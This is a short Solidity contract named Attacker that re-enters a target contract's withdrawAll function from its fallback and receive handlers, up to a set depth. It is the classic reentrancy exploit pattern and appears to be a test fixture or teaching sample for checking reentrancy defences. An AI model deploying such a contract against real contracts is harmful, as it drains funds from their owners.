contract Attacker {
    C public target;
    uint256 public remaining;

    constructor(C _target, uint256 _depth) payable {
        target = _target;
        remaining = _depth;
    }

    fallback() external payable {
        if (remaining > 0) {
            remaining--;
            target.withdrawAll();
        }
    }

    receive() external payable {
        if (remaining > 0) {
            remaining--;
            target.withdrawAll();
        }
    }
}

